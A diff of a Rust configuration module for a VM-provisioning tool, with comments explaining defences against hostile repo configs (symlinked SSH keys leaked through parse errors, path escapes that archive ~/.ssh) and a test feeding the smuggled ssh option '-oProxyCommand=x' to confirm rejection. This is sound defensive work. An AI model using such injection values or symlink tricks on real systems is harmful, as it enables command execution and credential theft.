@@ -14,21 +14,71 @@
 //!
 //! Because `bombyx.toml` ships *inside a repo*, it is
 //! attacker-controlled data the moment you clone or check out
-//! someone else's branch. Every field is therefore validated
-//! against an explicit allowlist rather than trusted -- see
-//! `Config::validate`, which every constructor runs. Not a
-//! doc link: `validate` is private, and rustdoc rejects a
-//! public page pointing at a private item.
+//! someone else's branch. So every field is checked against an
+//! explicit allowlist rather than trusted.
+//!
+//! Two of them are checked by their *type* and cannot be built
+//! wrong at all: see [`RepoUrl`]. The rest are checked by
+//! `Config::validate`, which the loading path runs. `Config`
+//! has public fields, so a hand-built one skips that check.
+//! That is a gap rather than a decision, argued once in
+//! `docs/architecture.md` under "What config values are
+//! checked". (`validate` is named rather than linked because
+//! it is private, and rustdoc rejects a public page pointing
+//! at a private item.)
+//!
+//! # Where each rule lives
+//!
+//! This module owns [`Config`] itself, the overlay, and the
+//! order the two are assembled in. Everything else is a private
+//! child module, so rustdoc will not list them:
+//!
+//! - `read` -- getting a config file off disk: whether the path
+//!   may be a symlink, how large a file may be, where the
+//!   overlay sits, and how a TOML error is summarised.
+//! - `error` -- the two error types, and why there are two.
+//! - `guards` -- the rules more than one field shares.
+//! - `host` -- where the VM host name comes from, and its shape.
+//! - `root` -- every rule `remote_root` must pass.
+//! - `source` -- the `[source]` table and its two checked types.
+//! - `vm` -- the `[vm]` table.
+//!
+//! A new field rule belongs in the module that owns the field.
+//! Put it in `guards` only once a second field needs it.
 
-use std::path::{Component, Path, PathBuf};
+use std::path::Path;
 
 use serde::Deserialize;
-use thiserror::Error;
 
 use crate::name::{ScratchName, check_segment};
 
+mod error;
+mod guards;
 mod host;
+mod read;
+mod root;
+mod source;
+mod vm;
 
+/// The `[vm]` and `[source]` tables every project file needs.
+///
+/// Every test that needs them reads this one constant. Writing
+/// the eleven lines out per test module would mean editing each
+/// module to add a required field, and a module somebody missed
+/// would fail in a test about something else entirely.
+#[cfg(test)]
+const REQUIRED_TABLES: &str = "\n[vm]\n\
+     provider = \"libvirt\"\n\
+     box = \"generic/ubuntu2204\"\n\
+     cpus = 2\n\
+     memory = 2048\n\
+     \n\
+     [source]\n\
+     repo = \"https://example.invalid/myproject.git\"\n\
+     ref = \"main\"\n\
+     script = \"vagrant/provision.sh\"\n";
+
+pub use error::{ConfigError, FieldError};
 pub use host::{
     CONFIG_DIR_ENV, HOST_ENV, HostOrigin, HostSources, USER_CONFIG_FILE,
     user_config_dir,
@@ -36,6 +86,14 @@ pub use host::{
 pub(crate) use host::{
     HostProblem, host_places, host_problem, is_anchored_dir, resolve_host,
 };
+pub use read::local_config_path;
+pub use source::{RepoUrl, ScriptPath, Source};
+pub use vm::{Provider, Vm};
+
+use read::{
+    MAX_CONFIG_BYTES, Symlinks, from_toml, path_display, read_optional,
+};
+pub(crate) use root::path_segments;
 
 /// Default directory (relative to the project root) holding
 /// the Vagrantfile and provisioning scripts.
@@ -44,160 +102,6 @@ const DEFAULT_VAGRANT_DIR: &str = "vagrant";
 /// Default root on the VM host under which project
 /// directories are created.
 const DEFAULT_REMOTE_ROOT: &str = "~/vms";
-
-/// Largest configuration file that will be read.
-///
-/// Generous for a handful of keys, and small enough that a file
-/// committed to a repo cannot make bombyx read it into memory
-/// without bound.
-const MAX_CONFIG_BYTES: u64 = 64 * 1024;
-
-/// Errors produced while loading a project configuration.
-#[derive(Debug, Error)]
-pub enum ConfigError {
-    /// The configuration file does not exist.
-    #[error("config file not found: {}", .0.display())]
-    NotFound(PathBuf),
-
-    /// The configuration file could not be read.
-    #[error("failed to read {}: {source}", .path.display())]
-    Read {
-        /// Path that could not be read.
-        path: PathBuf,
-        /// Underlying I/O error.
-        source: std::io::Error,
-    },
-
-    /// A configuration path exists but is not a regular file.
-    #[error("{} is not a regular file", .0.display())]
-    NotAFile(PathBuf),
-
-    /// A configuration file is implausibly large.
-    #[error("{} is larger than {MAX_CONFIG_BYTES} bytes", .0.display())]
-    TooLarge(PathBuf),
-
-    /// The configuration file is not valid TOML, or does not
-    /// match the expected shape.
-    ///
-    /// **Carries a summary, not the `toml` crate's `Display`.**
-    /// That rendering quotes the offending *source line* into the
-    /// message, and bombyx printed it straight to stderr:
-    ///
-    /// ```text
-    /// bombyx: loading bombyx.toml: invalid config in bombyx.toml:
-    /// TOML parse error at line 1, column 12
-    ///   |
-    /// 1 | -----BEGIN OPENSSH PRIVATE KEY-----
-    /// ```
-    ///
-    /// Reproduced against the built binary. `bombyx.toml` can be a
-    /// symlink -- the overlay path refuses one, the base path does
-    /// not, and nobody inspects a config after a clone -- so a
-    /// hostile repo could aim it at `~/.ssh/id_ed25519` and have a
-    /// line of it echoed.
-    ///
-    /// What is kept is the part that helps: the position and the
-    /// reason. What is dropped is the quoted line. Naming
-    /// `line 1, column 12` and "expected an equals" is enough to
-    /// correct a malformed config; the file's own contents are not
-    /// bombyx's to print.
-    #[error("invalid config in {}: {summary}", .path.display())]
-    Parse {
-        /// Path that failed to parse.
-        path: PathBuf,
-        /// Position and reason, without the source snippet.
-        summary: String,
-    },
-
-    /// A required field was present but empty.
-    #[error("`{field}` must not be empty")]
-    Empty {
-        /// Name of the offending field.
-        field: &'static str,
-    },
-
-    /// A field held a value outside its allowed shape.
-    #[error("invalid `{field}`: {reason}")]
-    Invalid {
-        /// Name of the offending field.
-        field: &'static str,
-        /// What rule the value broke.
-        reason: String,
-    },
-
-    /// The committed project file carried a `host` key.
-    ///
-    /// Refused rather than ignored. A committed host names one
-    /// developer's machine, and a stale one that still parses
-    /// is how `destroy` ends up deleting a directory on a
-    /// colleague's host.
-    #[error(
-        "`host` is not allowed in {}: it names one developer's \
-         machine, and this file is committed. Move that line to \
-         {places}",
-        .path.display()
-    )]
-    HostInProjectFile {
-        /// The project file carrying the key.
-        path: PathBuf,
-        /// Where the value belongs instead.
-        places: String,
-    },
-
-    /// No source supplied a VM host.
-    #[error(
-        "no VM host configured -- set it in {places}, pass \
-         --host, or set {HOST_ENV}"
-    )]
-    HostMissing {
-        /// The files that would supply one.
-        places: String,
-    },
-
-    /// The winning source supplied an unusable host.
-    ///
-    /// Separate from [`ConfigError::Invalid`] so the message can
-    /// name *where the value came from*. As a plain field error
-    /// the only path in it was the project file's -- the one file
-    /// now forbidden to carry a host -- so the message sent the
-    /// operator to edit the wrong thing.
-    #[error("invalid VM host from {origin}: {reason}")]
-    InvalidHost {
-        /// Which source supplied it.
-        origin: String,
-        /// What rule the value broke.
-        reason: String,
-    },
-}
-
-/// Characters allowed in a path on the VM host.
-fn is_remote_path_char(c: char) -> bool {
-    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '~')
-}
-
-/// Fewest real segments `remote_root` must contain.
-///
-/// One, so `<root>/<project>` is always at least two deep.
-/// bombyx deletes that directory on teardown, and two segments
-/// is the floor below which a configuration mistake stops being
-/// recoverable: it keeps a root of `/` or `~` from making the
-/// target a top-level or home-adjacent directory.
-const MIN_ROOT_SEGMENTS: usize = 1;
-
-/// The meaningful segments of a remote path.
-///
-/// Drops the leading `~` root marker and any empty segment left
-/// by a doubled or trailing slash, so counting the result
-/// measures real depth rather than characters. A `.` segment is
-/// deliberately *kept*: the caller's job is to reject it, and
-/// filtering it here would let `~/.` pass as depth one.
-pub(crate) fn path_segments(path: &str) -> Vec<&str> {
-    path.strip_prefix('~')
-        .unwrap_or(path)
-        .split('/')
-        .filter(|s| !s.is_empty())
-        .collect()
-}
 
 /// A resolved bombyx configuration.
 ///
@@ -228,6 +132,13 @@ pub struct Config {
     /// Root directory on the VM host under which project
     /// directories are created.
     pub remote_root: String,
+
+    /// The machine to build. Rendered into the Vagrantfile
+    /// bombyx writes on the VM host.
+    pub vm: Vm,
+
+    /// Where the guest clones the project from.
+    pub source: Source,
 }
 
 /// The committed project file, exactly as it parses.
@@ -252,11 +163,10 @@ struct ProjectFile {
 
     #[serde(default = "default_remote_root")]
     remote_root: String,
-}
 
-/// A path as it appears in a message.
-fn path_display(path: &Path) -> String {
-    path.display().to_string()
+    vm: Vm,
+
+    source: Source,
 }
 
 fn default_vagrant_dir() -> String {
@@ -297,10 +207,20 @@ pub struct Overlay {
     pub vagrant_dir: Option<String>,
     /// Replaces [`Config::remote_root`].
     pub remote_root: Option<String>,
+    /// Replaces [`Config::vm`] wholesale.
+    ///
+    /// Whole-section rather than field by field: a half-stated
+    /// machine reads as a merge of two sizes and neither file
+    /// shows the result. Naming `[vm]` here means naming all of
+    /// it, which is what the base file already requires.
+    pub vm: Option<Vm>,
+    /// Replaces [`Config::source`] wholesale, for the same
+    /// reason as [`Overlay::vm`].
+    pub source: Option<Source>,
 }
 
 /// Overwrites `dst` when the overlay supplied a value.
-fn replace(dst: &mut String, src: Option<String>) {
+fn replace<T>(dst: &mut T, src: Option<T>) {
     if let Some(value) = src {
         *dst = value;
     }
@@ -315,6 +235,8 @@ impl ProjectFile {
             project: self.project,
             vagrant_dir: self.vagrant_dir,
             remote_root: self.remote_root,
+            vm: self.vm,
+            source: self.source,
         };
         match overlay {
             Some(overlay) => cfg.with_overlay(overlay),
@@ -343,217 +265,6 @@ fn reject_host_key(
     })
 }
 
-/// Requires a path that stays inside the project directory.
-///
-/// The value is joined onto the working directory, and
-/// `Path::join` with an absolute operand *discards* the left
-/// side -- so `vagrant_dir = "/etc"` makes `up` archive `/etc`
-/// rather than a directory in the project. Since `bombyx.toml`
-/// travels inside a repo, that turned a clone into
-/// "tar the operator's `~/.ssh` and scp it to the host named in
-/// the same file".
-///
-/// Rooted spellings are checked directly rather than left to
-/// [`Path::is_absolute`], because that answers per-platform: a
-/// Windows drive prefix is not absolute on Unix, and the same
-/// config file is read on both.
-fn check_project_relative(
-    field: &'static str,
-    value: &str,
-) -> Result<(), ConfigError> {
-    let invalid = |reason: &str| ConfigError::Invalid {
-        field,
-        reason: reason.to_owned(),
-    };
-
-    let bytes = value.as_bytes();
-    if bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' {
-        return Err(invalid("must not name a drive"));
-    }
-    if value.starts_with('/') || value.starts_with('\\') {
-        return Err(invalid("must be relative to the project directory"));
-    }
-    if value.starts_with('~') {
-        return Err(invalid("must not start with `~`"));
-    }
-
-    // Everything left must be an ordinary segment. This is what
-    // rejects `..` and `.`, in any position rather than only at
-    // the front.
-    for component in Path::new(value).components() {
-        if !matches!(component, Component::Normal(_)) {
-            return Err(invalid(
-                "must be a plain relative path, with no `.`, \
-                 `..` or root",
-            ));
-        }
-    }
-
-    Ok(())
-}
-
-/// Deserializes TOML, naming `path` in any error.
-fn from_toml<T>(source: &str, path: &Path) -> Result<T, ConfigError>
-where
-    T: serde::de::DeserializeOwned,
-{
-    toml::from_str(source).map_err(|e| ConfigError::Parse {
-        path: path.to_path_buf(),
-        summary: toml_summary(source, &e),
-    })
-}
-
-/// Position and reason from a TOML error, without the source line.
-///
-/// `toml::de::Error`'s own `Display` quotes the offending line into
-/// the message, and bombyx printed that to stderr -- so a
-/// `bombyx.toml` symlinked at a private key echoed a line of it. See
-/// [`ConfigError::Parse`] for the reproduction.
-///
-/// `message()` is the reason alone: "expected an equals, found a
-/// newline", with no snippet and no position. `span()` gives a byte
-/// range, so `source` is needed to turn it into a line and column --
-/// which is the whole reason the source is a parameter here and is
-/// never put into the result.
-fn toml_summary(source: &str, e: &toml::de::Error) -> String {
-    let reason = e.message().trim();
-    match e.span() {
-        Some(span) => {
-            let (line, column) = line_column(source, span.start);
-            format!("line {line}, column {column}: {reason}")
-        }
-        // No span on a shape mismatch -- a missing field, an
-        // unknown key -- and the reason names the field there,
-        // which is the whole answer.
-        None => reason.to_owned(),
-    }
-}
-
-/// One-based line and column for a byte offset into `source`.
-///
-/// The column counts *characters*, not bytes, so a non-ASCII line
-/// does not report a position past where the operator sees the
-/// problem. An offset past the end clamps to the last line, which is
-/// what a truncated file produces.
-fn line_column(source: &str, offset: usize) -> (usize, usize) {
-    let upto = &source[..offset.min(source.len())];
-    let line = upto.bytes().filter(|b| *b == b'\n').count() + 1;
-    let column =
-        upto.rsplit('\n').next().unwrap_or_default().chars().count() + 1;
-    (line, column)
-}
-
-/// Whether a config file may be a symlink.
-///
-/// Named rather than a bare `bool` so the two call sites read as
-/// a policy choice instead of a flag.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum Symlinks {
-    /// Judge the path as itself: a symlink is refused. For files
-    /// beside the project config, whose path a repo influences.
-    Refuse,
-    /// Follow the link, still requiring a regular file at the
-    /// end. For the operator's own dotfile.
-    Follow,
-}
-
-/// Reads a config file that is allowed not to exist.
-///
-/// Absence is `None`. Anything else is an error rather than a
-/// fallback: a config that exists but cannot be read is a
-/// problem to report, not a reason to quietly send commands to
-/// the host the operator meant to override.
-///
-/// Anything that is not a regular file is rejected -- pointed at
-/// `/dev/zero` or a FIFO, reading would hang or allocate without
-/// bound -- and the size cap bounds an ordinary large file.
-///
-/// `symlinks` decides how the path itself is judged, and the two
-/// answers are not arbitrary:
-///
-/// - [`Symlinks::Refuse`] for `bombyx.toml` and the overlay
-///   beside it. That path is *derived* and a repo can commit a
-///   symlink there; pointed at `~/.ssh/id_ed25519` it would make
-///   the TOML parse error echo a line of the key to stderr.
-/// - [`Symlinks::Follow`] for the per-developer `config.toml`.
-///   Nothing in a clone can create or retarget a file in the
-///   operator's own config directory, so the refusal buys nothing
-///   there -- and it broke every ordinary dotfile manager
-///   (`stow`, `chezmoi`, a hand-made `ln -s`), which symlink
-///   exactly this kind of file into place. The failure was a hard
-///   error on every subcommand whose message did not mention
-///   symlinks.
-fn read_optional(
-    path: &Path,
-    symlinks: Symlinks,
-) -> Result<Option<String>, ConfigError> {
-    use std::io::Read as _;
-
-    let stat = match symlinks {
-        Symlinks::Refuse => std::fs::symlink_metadata,
-        Symlinks::Follow => std::fs::metadata,
-    };
-
-    let meta = match stat(path) {
-        Ok(meta) => meta,
-        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
-            return Ok(None);
-        }
-        Err(source) => {
-            return Err(ConfigError::Read {
-                path: path.to_path_buf(),
-                source,
-            });
-        }
-    };
-
-    if !meta.is_file() {
-        return Err(ConfigError::NotAFile(path.to_path_buf()));
-    }
-
-    let read = |source| ConfigError::Read {
-        path: path.to_path_buf(),
-        source,
-    };
-
-    let file = std::fs::File::open(path).map_err(read)?;
-    let mut source = String::new();
-    // One byte past the cap, so a file *at* the limit is
-    // accepted and anything beyond it is detectable rather than
-    // silently truncated into a confusing parse error.
-    file.take(MAX_CONFIG_BYTES + 1)
-        .read_to_string(&mut source)
-        .map_err(read)?;
-
-    if source.len() as u64 > MAX_CONFIG_BYTES {
-        return Err(ConfigError::TooLarge(path.to_path_buf()));
-    }
-
-    Ok(Some(source))
-}
-
-/// Where the overlay for `path` lives, if it can have one.
-///
-/// Beside the file it overrides, named `<stem>.local.toml`: the
-/// original extension is *replaced*, not preserved, so
-/// `staging.toml` and `staging.yaml` would share
-/// `staging.local.toml`. Deriving it from the argument rather
-/// than fixing one name is what makes `--config staging.toml`
-/// look for `staging.local.toml`, so the override is always
-/// discoverable from the file it overrides.
-///
-/// `None` when `path` has no file name at all -- `..`, or a
-/// bare directory. Returning a path there would put the overlay
-/// *beside* the directory rather than in it, which is a
-/// surprise nobody asked for.
-#[must_use]
-pub fn local_config_path(path: &Path) -> Option<PathBuf> {
-    let stem = path.file_stem()?;
-    let mut name = stem.to_os_string();
-    name.push(".local.toml");
-    Some(path.with_file_name(name))
-}
-
 impl Config {
     /// Returns this configuration with `overlay` applied.
     ///
@@ -579,11 +290,15 @@ impl Config {
             project,
             vagrant_dir,
             remote_root,
+            vm,
+            source,
         } = overlay;
 
         replace(&mut self.project, project);
         replace(&mut self.vagrant_dir, vagrant_dir);
         replace(&mut self.remote_root, remote_root);
+        replace(&mut self.vm, vm);
+        replace(&mut self.source, source);
         self
     }
 
@@ -628,15 +343,15 @@ impl Config {
 
     /// The config every module's tests use.
     ///
-    /// One copy, next to the type it builds. The same four lines
-    /// were written out in four test modules, so adding a required
-    /// field meant four identical edits and the two literals were
-    /// pinned in four places.
+    /// It lives next to the type it builds, so every test module
+    /// shares one copy. Written out per module, adding a required
+    /// field would mean the same edit in each of them, and the
+    /// two literals would be pinned in as many places.
     #[cfg(test)]
     #[must_use]
     pub(crate) fn for_tests() -> Self {
         Self::parse(
-            "project = \"myproject\"\n",
+            &format!("project = \"myproject\"\n{REQUIRED_TABLES}"),
             Path::new("bombyx.toml"),
             "vmhost",
         )
@@ -706,7 +421,7 @@ impl Config {
             resolve_host(sources, overlay.as_mut(), local.as_deref())?;
 
         // Checked here, while the winning source is still known,
-        // so the message names the file (or flag) actually
+        // so the message identifies the file (or flag) actually
         // carrying the bad value rather than the project file.
         if let Some(problem) = host_problem(&host) {
             return Err(ConfigError::InvalidHost {
@@ -749,15 +464,14 @@ impl Config {
     /// code on this workstation from a bare `bombyx status`,
     /// before any network traffic.
     ///
-    /// That value can no longer arrive from a cloned repo,
-    /// because `host` is refused in `bombyx.toml` (see
-    /// [`ConfigError::HostInProjectFile`]). The check stays for
-    /// the sources that remain: a gitignored
+    /// A cloned repo cannot supply that value, because `host` is
+    /// refused in `bombyx.toml` (see
+    /// [`ConfigError::HostInProjectFile`]). The check covers the
+    /// three sources that can: a gitignored
     /// `bombyx.local.toml`, a per-developer `config.toml`, and
-    /// `--host` / [`HOST_ENV`], all of which a mistake or a
-    /// careless script can still fill in. The other fields are
-    /// still repo-supplied, so their rules carry the original
-    /// weight.
+    /// `--host` / [`HOST_ENV`]. A mistake or a careless script
+    /// fills any of those in. The other fields *are*
+    /// repo-supplied, so their rules carry the full weight.
     fn validate(&self) -> Result<(), ConfigError> {
         // The host rule lives in `host_problem`, so this and the
         // source-naming check in `load` cannot disagree.
@@ -774,23 +488,32 @@ impl Config {
             None => {}
         }
 
-        for (field, value) in [
-            ("project", &self.project),
-            ("vagrant_dir", &self.vagrant_dir),
-            ("remote_root", &self.remote_root),
+        // Each field specifies the program it will reach.
+        //
+        // `project` and `vagrant_dir` are checked here;
+        // `remote_root` gets the same two rules inside
+        // `root::check` below, along with its own four.
+        //
+        // **For these three the rule is a precaution, not a live
+        // hole.** Only `host` is handed to a program as a bare
+        // argument that a leading `-` could turn into an option.
+        // `project` and `remote_root` go through
+        // `quote_remote_path` into a shell script that `ssh`
+        // runs, so they arrive quoted; `vagrant_dir` is joined
+        // onto the current directory before it reaches `tar -C`,
+        // and a join puts a directory in front of the dash. The
+        // rule is kept anyway, because each of those three
+        // protections lives in a different file from the value,
+        // and any of them could be rewritten by somebody who
+        // does not know it was load-bearing.
+        for (field, value, tool) in [
+            ("project", &self.project, "ssh"),
+            ("vagrant_dir", &self.vagrant_dir, "tar"),
         ] {
-            if value.trim().is_empty() {
-                return Err(ConfigError::Empty { field });
-            }
-            if value.starts_with('-') {
-                return Err(ConfigError::Invalid {
-                    field,
-                    reason: "must not start with `-`, which \
-                             ssh and scp read as an option"
-                        .to_owned(),
-                });
-            }
+            guards::check_not_empty(field, value)?;
+            guards::check_not_an_option(field, value, tool)?;
         }
+        guards::check_not_empty("remote_root", &self.remote_root)?;
 
         // `project` becomes one directory name on the host.
         check_segment(&self.project).map_err(|e| ConfigError::Invalid {
@@ -801,80 +524,12 @@ impl Config {
         // `vagrant_dir` is the one field that names a path on
         // *this* machine, so it is the one that can point the
         // archive at something outside the project.
-        check_project_relative("vagrant_dir", &self.vagrant_dir)?;
+        guards::check_project_relative("vagrant_dir", &self.vagrant_dir)?;
 
-        charset(
-            "remote_root",
-            &self.remote_root,
-            is_remote_path_char,
-            "letters, digits, `.`, `_`, `-`, `/` or `~`",
-        )?;
-        // Everything below exists because bombyx *deletes* the
-        // directory it derives from `remote_root`. All of it is
-        // enforced once, here, so every command agrees on which
-        // roots are usable -- gating only the removal would
-        // leave `up` free to extract a tarball into `/etc` while
-        // teardown refused to touch it. `bombyx.toml` travels
-        // inside a repo, so this is attacker-controlled input.
-        //
-        // The root must be anchored. An unrooted value resolves
-        // against the SSH login directory, which makes the depth
-        // below meaningless.
-        if !(self.remote_root.starts_with('~')
-            || self.remote_root.starts_with('/'))
-        {
-            return Err(ConfigError::Invalid {
-                field: "remote_root",
-                reason: "must start with `~` or `/`; a relative \
-                         path resolves against the login \
-                         directory"
-                    .to_owned(),
-            });
-        }
-
-        // `..` escapes the root outright. `.` is subtler and was
-        // the hole in the first version of this check: it adds a
-        // segment without adding depth, so `remote_root = "/."`
-        // with `project = "etc"` counted as two segments deep
-        // while resolving to `/etc`.
-        let segments = path_segments(&self.remote_root);
-        if let Some(bad) = segments.iter().find(|s| **s == "." || **s == "..") {
-            return Err(ConfigError::Invalid {
-                field: "remote_root",
-                reason: format!(
-                    "must not contain a `{bad}` segment; it changes \
-                     where the path resolves without changing how \
-                     deep it looks"
-                ),
-            });
-        }
-
-        if segments.len() < MIN_ROOT_SEGMENTS {
-            return Err(ConfigError::Invalid {
-                field: "remote_root",
-                reason: format!(
-                    "must be at least {MIN_ROOT_SEGMENTS} directory \
-                     deep, so the project directory bombyx creates \
-                     and deletes is not a top-level one"
-                ),
-            });
-        }
-
-        // A `~` is only expanded by the remote shell in
-        // leading position; anywhere else it is a literal
-        // character and almost certainly a mistake.
-        if self
-            .remote_root
-            .char_indices()
-            .any(|(i, c)| c == '~' && i > 0)
-        {
-            return Err(ConfigError::Invalid {
-                field: "remote_root",
-                reason: "`~` is only allowed as the first \
-                         character"
-                    .to_owned(),
-            });
-        }
+        // Every `remote_root` rule lives in `config::root`,
+        // because bombyx deletes the directory it derives from
+        // that value. See the module for what each rule stops.
+        root::check(&self.remote_root)?;
 
         // `vagrant_dir` is a local path, so it must tolerate
         // Windows spellings (`infra\vm`, `C:\...`). Only
@@ -886,6 +541,22 @@ impl Config {
             });
         }
 
+        self.validate_generated()
+    }
+
+    /// Runs the `[vm]` and `[source]` checks that types cannot.
+    ///
+    /// Each table's rules live in the module that owns it, and
+    /// this is the only place either is called from, so no
+    /// caller can run one half of the checks without the other.
+    ///
+    /// Split out of [`Config::validate`] because that function
+    /// outgrew the 100-line limit.
+    fn validate_generated(&self) -> Result<(), ConfigError> {
+        // The `?` widens each `FieldError` into a `ConfigError`.
+        // See the `From` impl in `config::error`.
+        vm::validate(&self.vm)?;
+        source::validate(&self.source)?;
         Ok(())
     }
 
@@ -917,27 +588,10 @@ impl Config {
     }
 }
 
-/// Checks every character of `value` against `allowed`.
-fn charset(
-    field: &'static str,
-    value: &str,
-    allowed: fn(char) -> bool,
-    expected: &str,
-) -> Result<(), ConfigError> {
-    if let Some(bad) = value.chars().find(|c| !allowed(*c)) {
-        return Err(ConfigError::Invalid {
-            field,
-            reason: format!(
-                "character {bad:?} is not allowed; use only \
-                 {expected}"
-            ),
-        });
-    }
-    Ok(())
-}
-
 #[cfg(test)]
 mod tests {
+    use std::path::PathBuf;
+
     use super::host::config_dir_from;
     use super::*;
 
@@ -972,41 +626,74 @@ mod tests {
         let text = err.to_string();
         assert!(text.contains("hsot"), "{text}");
     }
-
-    #[test]
-    fn a_position_counts_lines_and_characters() {
-        assert_eq!(line_column("abc", 0), (1, 1));
-        assert_eq!(line_column("abc", 2), (1, 3));
-        assert_eq!(line_column("a\nbc", 2), (2, 1));
-        assert_eq!(line_column("a\nbc", 3), (2, 2));
-        assert_eq!(line_column("a\nb\nc", 4), (3, 1));
-        // Characters, not bytes: a multi-byte line must not report
-        // a column past where the operator sees the problem.
-        assert_eq!(line_column("äöü=", 6), (1, 4));
-        // Past the end clamps rather than panicking, which is what
-        // a truncated file produces.
-        assert_eq!(line_column("ab", 99), (1, 3));
+    /// The smallest project file that validates.
+    ///
+    /// Not one line: `[vm]` and `[source]` are required, so the
+    /// smallest valid file carries both tables.
+    ///
+    /// The tables come last, and every caller passes this whole
+    /// rather than appending to it. A bare key appended after a
+    /// table header joins that table instead of the top level,
+    /// and still parses -- so a test meaning to set
+    /// `remote_root` would silently set `vm.remote_root` and
+    /// fail on `deny_unknown_fields` somewhere unrelated.
+    fn minimal() -> String {
+        format!("project = \"myproject\"\n{REQUIRED_TABLES}")
     }
 
-    fn minimal() -> &'static str {
-        "project = \"myproject\"\n"
+    /// The required tables, for a test composing its own
+    /// top-level keys. Append this *after* those keys.
+    fn required_tables() -> &'static str {
+        "\n[vm]\n\
+         provider = \"libvirt\"\n\
+         box = \"generic/ubuntu2204\"\n\
+         cpus = 2\n\
+         memory = 2048\n\
+         \n\
+         [source]\n\
+         repo = \"https://example.invalid/myproject.git\"\n\
+         ref = \"main\"\n\
+         script = \"vagrant/provision.sh\"\n"
+    }
+
+    /// Appends the required tables when `source` lacks them.
+    ///
+    /// Nearly every test here varies one top-level key and
+    /// cares nothing about the machine description. Making each
+    /// spell out `[vm]` and `[source]` would bury the line under
+    /// test in ten lines of scenery.
+    ///
+    /// A test *about* a missing section must not be repaired by
+    /// this, so those call [`Config::parse`] directly rather
+    /// than going through the helpers below.
+    fn completed(source: &str) -> String {
+        // Any table header, not just `[vm]`. Sniffing for `[vm]`
+        // alone meant a fixture declaring only `[source]` -- the
+        // exact case a missing-`[vm]` test needs -- had a second
+        // `[source]` appended and failed on a duplicate key
+        // instead of on the missing table.
+        if source.lines().any(|l| l.trim_start().starts_with('[')) {
+            source.to_owned()
+        } else {
+            format!("{source}{}", required_tables())
+        }
     }
 
     fn parse(source: &str) -> Result<Config, ConfigError> {
-        Config::parse(source, Path::new("bombyx.toml"), "vmhost")
+        Config::parse(&completed(source), Path::new("bombyx.toml"), "vmhost")
     }
 
     /// Parses the minimal project file with an explicit host.
     ///
-    /// The host no longer comes from the file being parsed, so
-    /// a test about host values varies this argument rather than
+    /// The host does not come from the file being parsed, so a
+    /// test about host values varies this argument rather than
     /// the TOML.
     fn parse_with_host(host: &str) -> Result<Config, ConfigError> {
-        Config::parse(minimal(), Path::new("bombyx.toml"), host)
+        Config::parse(&minimal(), Path::new("bombyx.toml"), host)
     }
 
     fn good() -> Config {
-        parse(minimal()).unwrap()
+        parse(&minimal()).unwrap()
     }
 
     fn scratch(name: &str) -> ScratchName {
@@ -1113,6 +800,33 @@ mod tests {
     }
 
     #[test]
+    fn an_overlay_replaces_a_whole_table_or_none_of_it() {
+        // `[vm]` and `[source]` are replaced wholesale, so one
+        // machine size is in force rather than a merge of two
+        // that neither file states. Nothing pinned this, and the
+        // invariant rests on `Vm`'s fields all being required --
+        // a later `#[serde(default)]` would quietly turn it into
+        // a partial merge.
+        let overlay: Overlay = toml::from_str(
+            "[vm]\n\
+             provider = \"hyperv\"\n\
+             box = \"other/box\"\n\
+             cpus = 8\n\
+             memory = 16384\n",
+        )
+        .unwrap();
+        let cfg = good().with_overlay(overlay);
+        assert_eq!(cfg.vm.provider, Provider::Hyperv);
+        assert_eq!(cfg.vm.cpus, 8);
+        // `[source]` was not named, so the base file's stands.
+        assert_eq!(cfg.source.git_ref, "main");
+
+        // A half-stated table is refused rather than merged.
+        let partial: Result<Overlay, _> = toml::from_str("[vm]\ncpus = 8\n");
+        assert!(partial.is_err(), "a partial [vm] must not parse");
+    }
+
+    #[test]
     fn with_overlay_does_not_apply_host() {
         // `host` is ranked against `--host` and the environment
         // by `resolve_host`, both of which outrank the file.
@@ -1198,7 +912,7 @@ mod tests {
     fn project_dir(source: &str) -> (tempfile::TempDir, PathBuf) {
         let dir = tempfile::tempdir().unwrap();
         let base = dir.path().join("bombyx.toml");
-        std::fs::write(&base, source).unwrap();
+        std::fs::write(&base, completed(source)).unwrap();
         (dir, base)
     }
 
@@ -1232,7 +946,7 @@ mod tests {
 
     #[test]
     fn reports_no_host_configured_when_nothing_supplies_one() {
-        let (_dir, base) = project_dir(minimal());
+        let (_dir, base) = project_dir(&minimal());
         let err = load(&base, &HostSources::default()).unwrap_err();
         assert!(matches!(err, ConfigError::HostMissing { .. }));
         // Every way out is named, since the operator has to pick
@@ -1245,7 +959,7 @@ mod tests {
 
     #[test]
     fn takes_the_host_from_the_user_config_file() {
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         write_user_file(dir.path(), "my-vmhost");
         let sources = user_sources(dir.path());
         assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
@@ -1256,7 +970,7 @@ mod tests {
         // All four sources present at once, then removed one at
         // a time. Testing each in isolation would pass with any
         // ordering at all.
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         std::fs::write(
             dir.path().join("bombyx.local.toml"),
             "host = \"from-overlay\"\n",
@@ -1290,7 +1004,7 @@ mod tests {
         // force without re-deriving the ranking. Asserted for
         // every source, since a constant would satisfy any one of
         // them.
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         std::fs::write(
             dir.path().join("bombyx.local.toml"),
             "host = \"from-overlay\"\n",
@@ -1345,7 +1059,7 @@ mod tests {
         // message was the project file's -- the one file that must
         // not carry a host, so it sent the operator to edit the
         // wrong thing.
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         write_user_file(dir.path(), "-oProxyCommand=x");
         let err = load(&base, &user_sources(dir.path())).unwrap_err();
         let text = err.to_string();
@@ -1367,7 +1081,7 @@ mod tests {
         // `ln -s`) symlinks exactly this file -- which made bombyx
         // fail on every subcommand with a message that never
         // mentioned symlinks.
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         let real = dir.path().join("real-config.toml");
         std::fs::write(&real, "host = \"linked-host\"\n").unwrap();
 
@@ -1416,7 +1130,7 @@ mod tests {
         // An exported-but-empty variable is how a shell says "no
         // value". Taking it literally would report an empty-field
         // error naming a file the operator never edited.
-        let (dir, base) = project_dir(minimal());
+        let (dir, base) = project_dir(&minimal());
         write_user_file(dir.path(), "my-vmhost");
